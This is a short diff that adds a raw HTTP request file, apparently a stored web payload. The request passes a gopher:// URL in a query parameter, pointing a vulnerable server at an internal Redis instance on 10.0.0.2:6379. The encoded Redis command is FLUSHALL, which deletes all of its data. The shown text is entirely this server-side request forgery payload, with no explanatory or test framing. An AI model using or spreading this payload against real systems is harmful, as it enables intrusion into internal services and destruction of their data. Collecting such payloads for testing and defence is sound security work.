@@ -1,0 +1,4 @@
+GET /a?s='gopher://10.0.0.2:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
